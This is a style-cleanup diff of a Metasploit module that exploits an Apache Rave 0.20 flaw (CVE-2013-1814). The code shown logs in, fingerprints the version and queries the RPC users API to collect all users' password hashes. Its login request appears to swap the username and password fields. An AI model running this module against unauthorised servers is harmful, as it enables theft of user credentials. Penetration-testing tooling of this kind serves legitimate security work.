@@ -8,30 +8,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Apache Rave User Information Disclosure',
-      'Description'    => %q{
-        This module exploits an information disclosure in Apache Rave 0.20 and prior. The
-        vulnerability exists in the RPC API, which allows any authenticated user to
-        disclose information about all the users, including their password hashes. In order
-        to authenticate, the user can provide his own credentials. Also the default users
-        installed with Apache Rave 0.20 will be tried automatically. This module has been
-        successfully tested on Apache Rave 0.20.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Apache Rave User Information Disclosure',
+        'Description' => %q{
+          This module exploits an information disclosure in Apache Rave 0.20 and prior. The
+          vulnerability exists in the RPC API, which allows any authenticated user to
+          disclose information about all the users, including their password hashes. In order
+          to authenticate, the user can provide his own credentials. Also the default users
+          installed with Apache Rave 0.20 will be tried automatically. This module has been
+          successfully tested on Apache Rave 0.20.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Andreas Guth', # Vulnerability discovery and PoC
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2013-1814' ],
           [ 'OSVDB', '91235' ],
           [ 'BID', '58455' ],
           [ 'EDB', '24744']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -39,7 +45,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'Path to Apache Rave Portal', '/portal']),
         OptString.new('USERNAME', [ false, 'Apache Rave Username' ]),
         OptString.new('PASSWORD', [ false, 'Apache Rave Password' ]),
-      ])
+      ]
+    )
   end
 
   def post_auth?
@@ -50,8 +57,8 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.to_s, "j_spring_security_check")
 
     res = send_request_cgi({
-      'uri'      => uri,
-      'method'   => 'POST',
+      'uri' => uri,
+      'method' => 'POST',
       'vars_post' => {
         'j_password' => username,
         'j_username' => password
@@ -69,8 +76,8 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.to_s, "app", "api", "rpc", "users", "get")
 
     res = send_request_cgi({
-      'uri'      => uri,
-      'method'   => 'GET',
+      'uri' => uri,
+      'method' => 'GET',
       'vars_get' => {
         'offset' => "#{offset}"
       },
@@ -82,7 +89,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       return nil
     end
-
   end
 
   def setup
@@ -130,20 +136,18 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-
   def run
-
     print_status("#{rhost}:#{rport} - Fingerprinting...")
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "login"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, "login"),
+      'method' => 'GET',
     })
 
     if not res
       print_error("#{rhost}:#{rport} - No response, aborting...")
       return
     elsif res.code == 200 and res.body =~ /<span>Apache Rave ([0-9\.]*)<\/span>/
-      version =$1
+      version = $1
       if version <= "0.20"
         print_good("#{rhost}:#{rport} - Apache Rave #{version} found. Vulnerable. Proceeding...")
       else
@@ -229,6 +233,5 @@ class MetasploitModule < Msf::Auxiliary
       end
 
     end
-
   end
 end
